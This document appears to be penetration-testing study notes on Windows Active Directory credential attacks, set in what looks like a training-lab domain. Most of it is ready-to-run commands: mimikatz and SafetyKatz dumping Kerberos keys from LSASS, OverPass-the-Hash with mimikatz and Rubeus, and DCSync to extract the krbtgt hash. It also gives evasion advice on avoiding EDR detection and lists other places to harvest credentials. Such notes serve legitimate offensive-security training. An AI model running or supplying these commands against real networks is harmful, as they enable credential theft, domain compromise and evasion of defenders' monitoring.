### mimikatz
mimikatz can be used to extract credentials, tickets, replay credentials,
play with AD security and more.

Dump credentials
```powershell
mimikatz.exe -Command '"sekurlsa::ekeys"'
```

Using SafetyKatz (Minidump of lsass and PELoader to run mimikatz)
```powershell
Loader.exe SafetyKatz.exe "sekurlsa::ekeys"
Loader.exe SafetyKatz.exe "sekurlsa::evasive-keys"
```

### OverPass-The-Hash
Over Pass the hash (OPTH) generate tokens from hashes or keys - Kerberos only

> [!NOTE] **NOTE**
> Difference between `PTH` and `OPTH` is PTH` `uses local users and `OPTH` uses a domain users credentials to generate tickets and run processes in their context

Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs
elevation 
```powershell
Loader.exe SafetyKatz.exe "sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local/aes256:<aes256keys> /run:cmd.exe" "exit"
```

The above commands starts a process with a logon type 9 (same as runas
/netonly). This means that if you run a `whoami` it will still show as the low priv user, but when you access domain resources it will use the domain administrator credentials.

Rubeus (does not need elevation) - this overwrites your current tickets
```powershell
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```

Elevation required to create a new process
```powershell
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### DCSync
To extract credentials from the DC without code execution on it, we can
use DCSync

To use the DCSync feature for getting `krbtgt` hash execute the below
command with DA privileges for dcorp domain:
```powershell
Loader.exe SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```


Local Security Authority (`LSA`) is responsible for authentication on a Windows
machine. Local Security Authority Subsystem Service (`LSASS`) is its service.

`LSASS` stores credentials in multiple forms - NT hash, AES, Kerberos tickets and
so on.
- Credentials are stored by `LSASS` when a user:
- Logs on to a local session or RDP
- Uses RunAs
- Run a Windows service
- Runs a scheduled task or batch job
- Uses a Remote Administration tool

The `LSASS` process is therefore a very attractive target. It is also the most monitored process on a Windows machine.

**DONT TOUCH LSASS IF YOURE WORRIED ABOUT GETTING DETECTED**

Some of the credentials that can be extracted without touching `LSASS`.
- SAM hive (Registry) - Local credentials
-  `LSA` Secrets/SECURITY hive (Registry) - Service account passwords, Domain cached credentials etc. **NOT EVERY EDR WATCHES THE SECURITY HIVE**
- PowerShell console history
- DPAPI Protected Credentials (Disk) - Credentials Manager/Vault, Browser Cookies, Certificates, Azure Tokens etc.